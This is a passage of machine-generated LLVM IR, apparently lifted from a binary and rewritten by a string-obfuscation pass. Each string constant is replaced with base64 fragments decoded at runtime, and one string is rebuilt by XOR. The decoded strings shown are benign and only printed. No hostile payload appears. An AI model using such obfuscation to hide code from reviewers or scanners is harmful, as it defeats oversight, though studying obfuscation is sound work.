  %spi279 = bitcast i8* %plain.ptr.279 to [1 x i8]*
  %s6.118 = load [1 x i8], [1 x i8]* %spi279
;-------------------------------
  %sp6.118 = bitcast i8* %next5.118 to [1 x i8]*
  store [1 x i8] %s6.118, [1 x i8]* %sp6.118
  %next6.118 = getelementptr [10 x i8], [10 x i8]* %spi118, i32 0, i32 8
  
;-------------------------------
; Replace: %s7.118 = load [2 x i8], [2 x i8]* @str.7.118
  %cipher.ptr.280 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\41\3d\00", [5 x i8]* %cipher.ptr.280
  %cipher.280 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.280, i32 0, i32 0
  %plain.ptr.280 = tail call i8* @base64_decode(i8* %cipher.280)
  %spi280 = bitcast i8* %plain.ptr.280 to [2 x i8]*
  %s7.118 = load [2 x i8], [2 x i8]* %spi280
;-------------------------------
  %sp7.118 = bitcast i8* %next6.118 to [2 x i8]*
  store [2 x i8] %s7.118, [2 x i8]* %sp7.118
  %cast107= getelementptr [10 x i8], [10 x i8]* %spi118, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast107)
  br label %next107
BB_109:
;-------------------------------
; Replace: %cast109= getelementptr [11 x i8], [11 x i8]* @.str108, i64 0, i64 0
  %spi119 = alloca [11 x i8]
  
;-------------------------------
; Replace: %s0.119 = load [1 x i8], [1 x i8]* @str.0.119
  %cipher.ptr.288 = alloca [5 x i8]
  store [5 x i8] c"\62\77\3d\3d\00", [5 x i8]* %cipher.ptr.288
  %cipher.288 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.288, i32 0, i32 0
  %plain.ptr.288 = tail call i8* @base64_decode(i8* %cipher.288)
  %spi288 = bitcast i8* %plain.ptr.288 to [1 x i8]*
  %s0.119 = load [1 x i8], [1 x i8]* %spi288
;-------------------------------
  %sp0.119 = bitcast [11 x i8]* %spi119 to [1 x i8]*
  store [1 x i8] %s0.119, [1 x i8]* %sp0.119
  %next0.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.119 = load [1 x i8], [1 x i8]* @str.1.119
  %cipher.ptr.285 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.285
  %cipher.285 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.285, i32 0, i32 0
  %plain.ptr.285 = tail call i8* @base64_decode(i8* %cipher.285)
  %spi285 = bitcast i8* %plain.ptr.285 to [1 x i8]*
  %s1.119 = load [1 x i8], [1 x i8]* %spi285
;-------------------------------
  %sp1.119 = bitcast i8* %next0.119 to [1 x i8]*
  store [1 x i8] %s1.119, [1 x i8]* %sp1.119
  %next1.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.119 = load [2 x i8], [2 x i8]* @str.2.119
  %cipher.ptr.284 = alloca [5 x i8]
  store [5 x i8] c"\61\57\38\3d\00", [5 x i8]* %cipher.ptr.284
  %cipher.284 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.284, i32 0, i32 0
  %plain.ptr.284 = tail call i8* @base64_decode(i8* %cipher.284)
  %spi284 = bitcast i8* %plain.ptr.284 to [2 x i8]*
  %s2.119 = load [2 x i8], [2 x i8]* %spi284
;-------------------------------
  %sp2.119 = bitcast i8* %next1.119 to [2 x i8]*
  store [2 x i8] %s2.119, [2 x i8]* %sp2.119
  %next2.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 4
  
;-------------------------------
; Replace: %s3.119 = load [1 x i8], [1 x i8]* @str.3.119
  %cipher.ptr.286 = alloca [5 x i8]
  store [5 x i8] c"\61\67\3d\3d\00", [5 x i8]* %cipher.ptr.286
  %cipher.286 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.286, i32 0, i32 0
  %plain.ptr.286 = tail call i8* @base64_decode(i8* %cipher.286)
  %spi286 = bitcast i8* %plain.ptr.286 to [1 x i8]*
  %s3.119 = load [1 x i8], [1 x i8]* %spi286
;-------------------------------
  %sp3.119 = bitcast i8* %next2.119 to [1 x i8]*
  store [1 x i8] %s3.119, [1 x i8]* %sp3.119
  %next3.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.119 = load [1 x i8], [1 x i8]* @str.4.119
  %cipher.ptr.289 = alloca [5 x i8]
  store [5 x i8] c"\64\67\3d\3d\00", [5 x i8]* %cipher.ptr.289
  %cipher.289 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.289, i32 0, i32 0
  %plain.ptr.289 = tail call i8* @base64_decode(i8* %cipher.289)
  %spi289 = bitcast i8* %plain.ptr.289 to [1 x i8]*
  %s4.119 = load [1 x i8], [1 x i8]* %spi289
;-------------------------------
  %sp4.119 = bitcast i8* %next3.119 to [1 x i8]*
  store [1 x i8] %s4.119, [1 x i8]* %sp4.119
  %next4.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.119 = load [2 x i8], [2 x i8]* @str.5.119
  %cipher.ptr.290 = alloca [5 x i8]
  store [5 x i8] c"\61\53\77\3d\00", [5 x i8]* %cipher.ptr.290
  %cipher.290 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.290, i32 0, i32 0
  %plain.ptr.290 = tail call i8* @base64_decode(i8* %cipher.290)
  %spi290 = bitcast i8* %plain.ptr.290 to [2 x i8]*
  %s5.119 = load [2 x i8], [2 x i8]* %spi290
;-------------------------------
  %sp5.119 = bitcast i8* %next4.119 to [2 x i8]*
  store [2 x i8] %s5.119, [2 x i8]* %sp5.119
  %next5.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 8
  
;-------------------------------
; Replace: %s6.119 = load [1 x i8], [1 x i8]* @str.6.119
  %cipher.ptr.291 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.291
  %cipher.291 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.291, i32 0, i32 0
  %plain.ptr.291 = tail call i8* @base64_decode(i8* %cipher.291)
  %spi291 = bitcast i8* %plain.ptr.291 to [1 x i8]*
  %s6.119 = load [1 x i8], [1 x i8]* %spi291
;-------------------------------
  %sp6.119 = bitcast i8* %next5.119 to [1 x i8]*
  store [1 x i8] %s6.119, [1 x i8]* %sp6.119
  %next6.119 = getelementptr [11 x i8], [11 x i8]* %spi119, i32 0, i32 9
  
;-------------------------------
; Replace: %s7.119 = load [2 x i8], [2 x i8]* @str.7.119
  %cipher.ptr.287 = alloca [5 x i8]
  store [5 x i8] c"\63\67\41\3d\00", [5 x i8]* %cipher.ptr.287
  %cipher.287 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.287, i32 0, i32 0
  %plain.ptr.287 = tail call i8* @base64_decode(i8* %cipher.287)
  %spi287 = bitcast i8* %plain.ptr.287 to [2 x i8]*
  %s7.119 = load [2 x i8], [2 x i8]* %spi287
;-------------------------------
  %sp7.119 = bitcast i8* %next6.119 to [2 x i8]*
  store [2 x i8] %s7.119, [2 x i8]* %sp7.119
  %cast109= getelementptr [11 x i8], [11 x i8]* %spi119, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast109)
  br label %next109
BB_111:
;-------------------------------
; Replace: %cast111= getelementptr [10 x i8], [10 x i8]* @.str110, i64 0, i64 0
  %spi120 = alloca [10 x i8]
  
;-------------------------------
; Replace: %s0.120 = load [1 x i8], [1 x i8]* @str.0.120
  %cipher.ptr.293 = alloca [5 x i8]
  store [5 x i8] c"\64\41\3d\3d\00", [5 x i8]* %cipher.ptr.293
  %cipher.293 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.293, i32 0, i32 0
  %plain.ptr.293 = tail call i8* @base64_decode(i8* %cipher.293)
  %spi293 = bitcast i8* %plain.ptr.293 to [1 x i8]*
  %s0.120 = load [1 x i8], [1 x i8]* %spi293
;-------------------------------
  %sp0.120 = bitcast [10 x i8]* %spi120 to [1 x i8]*
  store [1 x i8] %s0.120, [1 x i8]* %sp0.120
  %next0.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.120 = load [1 x i8], [1 x i8]* @str.1.120
  %cipher.ptr.294 = alloca [5 x i8]
  store [5 x i8] c"\63\67\3d\3d\00", [5 x i8]* %cipher.ptr.294
  %cipher.294 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.294, i32 0, i32 0
  %plain.ptr.294 = tail call i8* @base64_decode(i8* %cipher.294)
  %spi294 = bitcast i8* %plain.ptr.294 to [1 x i8]*
  %s1.120 = load [1 x i8], [1 x i8]* %spi294
;-------------------------------
  %sp1.120 = bitcast i8* %next0.120 to [1 x i8]*
  store [1 x i8] %s1.120, [1 x i8]* %sp1.120
  %next1.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.120 = load [1 x i8], [1 x i8]* @str.2.120
  %cipher.ptr.297 = alloca [5 x i8]
  store [5 x i8] c"\62\77\3d\3d\00", [5 x i8]* %cipher.ptr.297
  %cipher.297 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.297, i32 0, i32 0
  %plain.ptr.297 = tail call i8* @base64_decode(i8* %cipher.297)
  %spi297 = bitcast i8* %plain.ptr.297 to [1 x i8]*
  %s2.120 = load [1 x i8], [1 x i8]* %spi297
;-------------------------------
  %sp2.120 = bitcast i8* %next1.120 to [1 x i8]*
  store [1 x i8] %s2.120, [1 x i8]* %sp2.120
  %next2.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.120 = load [2 x i8], [2 x i8]* @str.3.120
  %cipher.ptr.298 = alloca [5 x i8]
  store [5 x i8] c"\61\58\4d\3d\00", [5 x i8]* %cipher.ptr.298
  %cipher.298 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.298, i32 0, i32 0
  %plain.ptr.298 = tail call i8* @base64_decode(i8* %cipher.298)
  %spi298 = bitcast i8* %plain.ptr.298 to [2 x i8]*
  %s3.120 = load [2 x i8], [2 x i8]* %spi298
;-------------------------------
  %sp3.120 = bitcast i8* %next2.120 to [2 x i8]*
  store [2 x i8] %s3.120, [2 x i8]* %sp3.120
  %next3.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 5
  
;-------------------------------
; Replace: %s4.120 = load [1 x i8], [1 x i8]* @str.4.120
  %cipher.ptr.295 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.295
  %cipher.295 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.295, i32 0, i32 0
  %plain.ptr.295 = tail call i8* @base64_decode(i8* %cipher.295)
  %spi295 = bitcast i8* %plain.ptr.295 to [1 x i8]*
  %s4.120 = load [1 x i8], [1 x i8]* %spi295
;-------------------------------
  %sp4.120 = bitcast i8* %next3.120 to [1 x i8]*
  store [1 x i8] %s4.120, [1 x i8]* %sp4.120
  %next4.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 6
  
;-------------------------------
; Replace: %s5.120 = load [1 x i8], [1 x i8]* @str.5.120
  %cipher.ptr.299 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.299
  %cipher.299 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.299, i32 0, i32 0
  %plain.ptr.299 = tail call i8* @base64_decode(i8* %cipher.299)
  %spi299 = bitcast i8* %plain.ptr.299 to [1 x i8]*
  %s5.120 = load [1 x i8], [1 x i8]* %spi299
;-------------------------------
  %sp5.120 = bitcast i8* %next4.120 to [1 x i8]*
  store [1 x i8] %s5.120, [1 x i8]* %sp5.120
  %next5.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 7
  
;-------------------------------
; Replace: %s6.120 = load [1 x i8], [1 x i8]* @str.6.120
  %cipher.ptr.296 = alloca [5 x i8]
  store [5 x i8] c"\62\51\3d\3d\00", [5 x i8]* %cipher.ptr.296
  %cipher.296 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.296, i32 0, i32 0
  %plain.ptr.296 = tail call i8* @base64_decode(i8* %cipher.296)
  %spi296 = bitcast i8* %plain.ptr.296 to [1 x i8]*
  %s6.120 = load [1 x i8], [1 x i8]* %spi296
;-------------------------------
  %sp6.120 = bitcast i8* %next5.120 to [1 x i8]*
  store [1 x i8] %s6.120, [1 x i8]* %sp6.120
  %next6.120 = getelementptr [10 x i8], [10 x i8]* %spi120, i32 0, i32 8
  
;-------------------------------
; Replace: %s7.120 = load [2 x i8], [2 x i8]* @str.7.120
  %cipher.ptr.292 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\41\3d\00", [5 x i8]* %cipher.ptr.292
  %cipher.292 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.292, i32 0, i32 0
  %plain.ptr.292 = tail call i8* @base64_decode(i8* %cipher.292)
  %spi292 = bitcast i8* %plain.ptr.292 to [2 x i8]*
  %s7.120 = load [2 x i8], [2 x i8]* %spi292
;-------------------------------
  %sp7.120 = bitcast i8* %next6.120 to [2 x i8]*
  store [2 x i8] %s7.120, [2 x i8]* %sp7.120
  %cast111= getelementptr [10 x i8], [10 x i8]* %spi120, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast111)
  br label %next111
}

define internal fastcc void @ifdef_ifndef316(i32 %arg_esp) unnamed_addr  norecurse  !retregs !239 {
.exit:
  %tmp2_v.i1.i = add i32 %arg_esp, 4
  %tmp0_v.i2.i = and i32 %arg_esp, -16
  %0 = inttoptr i32 %arg_esp to i32*
  %1 = load i32, i32* %0, align 4
  %tmp2_v3.i.i = add i32 %tmp0_v.i2.i, -4
  %2 = inttoptr i32 %tmp2_v3.i.i to i32*
  store i32 %1, i32* %2, align 4
  %tmp2_v4.i3.i = add i32 %tmp0_v.i2.i, -8
  %3 = inttoptr i32 %tmp2_v4.i3.i to i32*
  store i32 0, i32* %3, align 8
  %tmp2_v5.i.i = add i32 %tmp0_v.i2.i, -12
  %4 = inttoptr i32 %tmp2_v5.i.i to i32*
  store i32 0, i32* %4, align 4
  %tmp2_v6.i.i = add i32 %tmp0_v.i2.i, -16
  %5 = inttoptr i32 %tmp2_v6.i.i to i32*
  store i32 %tmp2_v.i1.i, i32* %5, align 16
  %tmp2_v8.i.i = add i32 %tmp0_v.i2.i, -324
  %6 = inttoptr i32 %tmp2_v8.i.i to i32*
  store i32 134517236, i32* %6, align 4
  %tmp4_v.i21.i.b = load i1, i1* @segs.0, align 1
  %7 = inttoptr i32 %arg_esp to i32*
  %8 = load i32, i32* %7, align 4
  %tmp2_v2.i25.i = add i32 %tmp0_v.i2.i, -20
  %9 = inttoptr i32 %tmp2_v2.i25.i to i32*
  store i32 %8, i32* %9, align 4
  %tmp2_v5.i29.i = add i32 %tmp0_v.i2.i, -336
  %10 = inttoptr i32 %tmp2_v5.i29.i to i32*
;-------------------------------
; Replace: %spi.bis.314 = ptrtoint[18 x i8]* @str.bis.314 to i32
  %sp0.34 = alloca [18 x i8]
;-------------------------------
; Replace: store [18 x i8] c"\0A\22\1E\4C\3D\31\0D\3C\3F\10\5C\2E\55\33\68\58\57\41", [18 x i8]* %sp0.34
  %sp139 = alloca [18 x i8]
  
;-------------------------------
; Replace: %s0.139 = load [2 x i8], [2 x i8]* @str.0.139
  %cipher.ptr.380 = alloca [5 x i8]
  store [5 x i8] c"\43\69\49\3d\00", [5 x i8]* %cipher.ptr.380
  %cipher.380 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.380, i32 0, i32 0
  %plain.ptr.380 = tail call i8* @base64_decode(i8* %cipher.380)
  %spi380 = bitcast i8* %plain.ptr.380 to [2 x i8]*
  %s0.139 = load [2 x i8], [2 x i8]* %spi380
;-------------------------------
  %sp0.139 = bitcast [18 x i8]* %sp139 to [2 x i8]*
  store [2 x i8] %s0.139, [2 x i8]* %sp0.139
  %next0.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.139 = load [2 x i8], [2 x i8]* @str.1.139
  %cipher.ptr.383 = alloca [5 x i8]
  store [5 x i8] c"\48\6b\77\3d\00", [5 x i8]* %cipher.ptr.383
  %cipher.383 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.383, i32 0, i32 0
  %plain.ptr.383 = tail call i8* @base64_decode(i8* %cipher.383)
  %spi383 = bitcast i8* %plain.ptr.383 to [2 x i8]*
  %s1.139 = load [2 x i8], [2 x i8]* %spi383
;-------------------------------
  %sp1.139 = bitcast i8* %next0.139 to [2 x i8]*
  store [2 x i8] %s1.139, [2 x i8]* %sp1.139
  %next1.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 4
  
;-------------------------------
; Replace: %s2.139 = load [2 x i8], [2 x i8]* @str.2.139
  %cipher.ptr.384 = alloca [5 x i8]
  store [5 x i8] c"\50\54\45\3d\00", [5 x i8]* %cipher.ptr.384
  %cipher.384 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.384, i32 0, i32 0
  %plain.ptr.384 = tail call i8* @base64_decode(i8* %cipher.384)
  %spi384 = bitcast i8* %plain.ptr.384 to [2 x i8]*
  %s2.139 = load [2 x i8], [2 x i8]* %spi384
;-------------------------------
  %sp2.139 = bitcast i8* %next1.139 to [2 x i8]*
  store [2 x i8] %s2.139, [2 x i8]* %sp2.139
  %next2.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 6
  
;-------------------------------
; Replace: %s3.139 = load [3 x i8], [3 x i8]* @str.3.139
  %cipher.ptr.385 = alloca [5 x i8]
  store [5 x i8] c"\44\54\77\2f\00", [5 x i8]* %cipher.ptr.385
  %cipher.385 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.385, i32 0, i32 0
  %plain.ptr.385 = tail call i8* @base64_decode(i8* %cipher.385)
  %spi385 = bitcast i8* %plain.ptr.385 to [3 x i8]*
  %s3.139 = load [3 x i8], [3 x i8]* %spi385
;-------------------------------
  %sp3.139 = bitcast i8* %next2.139 to [3 x i8]*
  store [3 x i8] %s3.139, [3 x i8]* %sp3.139
  %next3.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 9
  
;-------------------------------
; Replace: %s4.139 = load [2 x i8], [2 x i8]* @str.4.139
  %cipher.ptr.386 = alloca [5 x i8]
  store [5 x i8] c"\45\46\77\3d\00", [5 x i8]* %cipher.ptr.386
  %cipher.386 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.386, i32 0, i32 0
  %plain.ptr.386 = tail call i8* @base64_decode(i8* %cipher.386)
  %spi386 = bitcast i8* %plain.ptr.386 to [2 x i8]*
  %s4.139 = load [2 x i8], [2 x i8]* %spi386
;-------------------------------
  %sp4.139 = bitcast i8* %next3.139 to [2 x i8]*
  store [2 x i8] %s4.139, [2 x i8]* %sp4.139
  %next4.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 11
  
;-------------------------------
; Replace: %s5.139 = load [2 x i8], [2 x i8]* @str.5.139
  %cipher.ptr.382 = alloca [5 x i8]
  store [5 x i8] c"\4c\6c\55\3d\00", [5 x i8]* %cipher.ptr.382
  %cipher.382 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.382, i32 0, i32 0
  %plain.ptr.382 = tail call i8* @base64_decode(i8* %cipher.382)
  %spi382 = bitcast i8* %plain.ptr.382 to [2 x i8]*
  %s5.139 = load [2 x i8], [2 x i8]* %spi382
;-------------------------------
  %sp5.139 = bitcast i8* %next4.139 to [2 x i8]*
  store [2 x i8] %s5.139, [2 x i8]* %sp5.139
  %next5.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 13
  
;-------------------------------
; Replace: %s6.139 = load [2 x i8], [2 x i8]* @str.6.139
  %cipher.ptr.381 = alloca [5 x i8]
  store [5 x i8] c"\4d\32\67\3d\00", [5 x i8]* %cipher.ptr.381
  %cipher.381 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.381, i32 0, i32 0
  %plain.ptr.381 = tail call i8* @base64_decode(i8* %cipher.381)
  %spi381 = bitcast i8* %plain.ptr.381 to [2 x i8]*
  %s6.139 = load [2 x i8], [2 x i8]* %spi381
;-------------------------------
  %sp6.139 = bitcast i8* %next5.139 to [2 x i8]*
  store [2 x i8] %s6.139, [2 x i8]* %sp6.139
  %next6.139 = getelementptr [18 x i8], [18 x i8]* %sp139, i32 0, i32 15
  
;-------------------------------
; Replace: %s7.139 = load [3 x i8], [3 x i8]* @str.7.139
  %cipher.ptr.387 = alloca [5 x i8]
  store [5 x i8] c"\57\46\64\42\00", [5 x i8]* %cipher.ptr.387
  %cipher.387 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.387, i32 0, i32 0
  %plain.ptr.387 = tail call i8* @base64_decode(i8* %cipher.387)
  %spi387 = bitcast i8* %plain.ptr.387 to [3 x i8]*
  %s7.139 = load [3 x i8], [3 x i8]* %spi387
;-------------------------------
  %sp7.139 = bitcast i8* %next6.139 to [3 x i8]*
  store [3 x i8] %s7.139, [3 x i8]* %sp7.139

  %spi139 = load [18 x i8], [18 x i8]* %sp139
  store [18 x i8] %spi139, [18 x i8]* %sp0.34
;-------------------------------
  %sp0.1.34 = bitcast [18 x i8]* %sp0.34 to i144*
  %i0.34 = load i144, i144* %sp0.1.34

  %sp1.34 = alloca [18 x i8]
;-------------------------------
; Replace: store [18 x i8] c"\44\4d\6a\6c\59\54\6f\49\58\30\31\41\31\56\48\6a\76\41", [18 x i8]* %sp1.34
  %sp140 = alloca [18 x i8]
  
;-------------------------------
; Replace: %s0.140 = load [2 x i8], [2 x i8]* @str.0.140
  %cipher.ptr.392 = alloca [5 x i8]
  store [5 x i8] c"\52\45\30\3d\00", [5 x i8]* %cipher.ptr.392
  %cipher.392 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.392, i32 0, i32 0
  %plain.ptr.392 = tail call i8* @base64_decode(i8* %cipher.392)
  %spi392 = bitcast i8* %plain.ptr.392 to [2 x i8]*
  %s0.140 = load [2 x i8], [2 x i8]* %spi392
;-------------------------------
  %sp0.140 = bitcast [18 x i8]* %sp140 to [2 x i8]*
  store [2 x i8] %s0.140, [2 x i8]* %sp0.140
  %next0.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.140 = load [2 x i8], [2 x i8]* @str.1.140
  %cipher.ptr.388 = alloca [5 x i8]
  store [5 x i8] c"\61\6d\77\3d\00", [5 x i8]* %cipher.ptr.388
  %cipher.388 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.388, i32 0, i32 0
  %plain.ptr.388 = tail call i8* @base64_decode(i8* %cipher.388)
  %spi388 = bitcast i8* %plain.ptr.388 to [2 x i8]*
  %s1.140 = load [2 x i8], [2 x i8]* %spi388
;-------------------------------
  %sp1.140 = bitcast i8* %next0.140 to [2 x i8]*
  store [2 x i8] %s1.140, [2 x i8]* %sp1.140
  %next1.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 4
  
;-------------------------------
; Replace: %s2.140 = load [2 x i8], [2 x i8]* @str.2.140
  %cipher.ptr.393 = alloca [5 x i8]
  store [5 x i8] c"\57\56\51\3d\00", [5 x i8]* %cipher.ptr.393
  %cipher.393 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.393, i32 0, i32 0
  %plain.ptr.393 = tail call i8* @base64_decode(i8* %cipher.393)
  %spi393 = bitcast i8* %plain.ptr.393 to [2 x i8]*
  %s2.140 = load [2 x i8], [2 x i8]* %spi393
;-------------------------------
  %sp2.140 = bitcast i8* %next1.140 to [2 x i8]*
  store [2 x i8] %s2.140, [2 x i8]* %sp2.140
  %next2.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 6
  
;-------------------------------
; Replace: %s3.140 = load [3 x i8], [3 x i8]* @str.3.140
  %cipher.ptr.390 = alloca [5 x i8]
  store [5 x i8] c"\62\30\6c\59\00", [5 x i8]* %cipher.ptr.390
  %cipher.390 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.390, i32 0, i32 0
  %plain.ptr.390 = tail call i8* @base64_decode(i8* %cipher.390)
  %spi390 = bitcast i8* %plain.ptr.390 to [3 x i8]*
  %s3.140 = load [3 x i8], [3 x i8]* %spi390
;-------------------------------
  %sp3.140 = bitcast i8* %next2.140 to [3 x i8]*
  store [3 x i8] %s3.140, [3 x i8]* %sp3.140
  %next3.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 9
  
;-------------------------------
; Replace: %s4.140 = load [2 x i8], [2 x i8]* @str.4.140
  %cipher.ptr.391 = alloca [5 x i8]
  store [5 x i8] c"\4d\44\45\3d\00", [5 x i8]* %cipher.ptr.391
  %cipher.391 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.391, i32 0, i32 0
  %plain.ptr.391 = tail call i8* @base64_decode(i8* %cipher.391)
  %spi391 = bitcast i8* %plain.ptr.391 to [2 x i8]*
  %s4.140 = load [2 x i8], [2 x i8]* %spi391
;-------------------------------
  %sp4.140 = bitcast i8* %next3.140 to [2 x i8]*
  store [2 x i8] %s4.140, [2 x i8]* %sp4.140
  %next4.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 11
  
;-------------------------------
; Replace: %s5.140 = load [2 x i8], [2 x i8]* @str.5.140
  %cipher.ptr.389 = alloca [5 x i8]
  store [5 x i8] c"\51\54\45\3d\00", [5 x i8]* %cipher.ptr.389
  %cipher.389 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.389, i32 0, i32 0
  %plain.ptr.389 = tail call i8* @base64_decode(i8* %cipher.389)
  %spi389 = bitcast i8* %plain.ptr.389 to [2 x i8]*
  %s5.140 = load [2 x i8], [2 x i8]* %spi389
;-------------------------------
  %sp5.140 = bitcast i8* %next4.140 to [2 x i8]*
  store [2 x i8] %s5.140, [2 x i8]* %sp5.140
  %next5.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 13
  
;-------------------------------
; Replace: %s6.140 = load [2 x i8], [2 x i8]* @str.6.140
  %cipher.ptr.394 = alloca [5 x i8]
  store [5 x i8] c"\56\6b\67\3d\00", [5 x i8]* %cipher.ptr.394
  %cipher.394 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.394, i32 0, i32 0
  %plain.ptr.394 = tail call i8* @base64_decode(i8* %cipher.394)
  %spi394 = bitcast i8* %plain.ptr.394 to [2 x i8]*
  %s6.140 = load [2 x i8], [2 x i8]* %spi394
;-------------------------------
  %sp6.140 = bitcast i8* %next5.140 to [2 x i8]*
  store [2 x i8] %s6.140, [2 x i8]* %sp6.140
  %next6.140 = getelementptr [18 x i8], [18 x i8]* %sp140, i32 0, i32 15
  
;-------------------------------
; Replace: %s7.140 = load [3 x i8], [3 x i8]* @str.7.140
  %cipher.ptr.395 = alloca [5 x i8]
  store [5 x i8] c"\61\6e\5a\42\00", [5 x i8]* %cipher.ptr.395
  %cipher.395 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.395, i32 0, i32 0
  %plain.ptr.395 = tail call i8* @base64_decode(i8* %cipher.395)
  %spi395 = bitcast i8* %plain.ptr.395 to [3 x i8]*
  %s7.140 = load [3 x i8], [3 x i8]* %spi395
;-------------------------------
  %sp7.140 = bitcast i8* %next6.140 to [3 x i8]*
  store [3 x i8] %s7.140, [3 x i8]* %sp7.140

  %spi140 = load [18 x i8], [18 x i8]* %sp140
  store [18 x i8] %spi140, [18 x i8]* %sp1.34
;-------------------------------
  %sp1.1.34 = bitcast [18 x i8]* %sp1.34 to i144*
  %i1.34 = load i144, i144* %sp1.1.34

  %xp34 = xor i144 %i0.34, %i1.34

  %fi.34 = alloca i144
  store i144 %xp34, i144* %fi.34

  %spi34 = bitcast i144* %fi.34 to [18 x i8]*
  %spi.bis.314 = ptrtoint[18 x i8]* %spi34 to i32
;-------------------------------
  store i32 %spi.bis.314, i32* %10, align 16
  %tmp2_v6.i30.i = add i32 %tmp0_v.i2.i, -340
  %11 = inttoptr i32 %tmp2_v6.i30.i to i32*
  store i32 134517268, i32* %11, align 4
  %arg.i.i = load i32, i32* %10, align 16
  %12 = inttoptr i32 %arg.i.i to i8*
;-------------------------------
;---Replaced puts with printf---
  %fp80 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %12)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
; Replace: %cast80= getelementptr [1 x i8], [1 x i8]* @.str79, i64 0, i64 0
  %cipher.ptr.215 = alloca [5 x i8]
  store [5 x i8] c"\43\67\3d\3d\00", [5 x i8]* %cipher.ptr.215
  %cipher.215 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.215, i32 0, i32 0
  %plain.ptr.215 = tail call i8* @base64_decode(i8* %cipher.215)
  %spi215 = bitcast i8* %plain.ptr.215 to [1 x i8]*
  %cast80= getelementptr [1 x i8], [1 x i8]* %spi215, i64 0, i64 0
;-------------------------------
  %13 = tail call i32 (i8*, ...) @printf(i8* nonnull dereferenceable(1) %cast80)  nobuiltin nounwind "no-builtins" , !funcname !240
;-------------------------------
;-------------------------------
; Replace: %spi.bis.313 = ptrtoint[16 x i8]* @str.bis.313 to i32
  %sp0.33 = alloca [16 x i8]
;-------------------------------
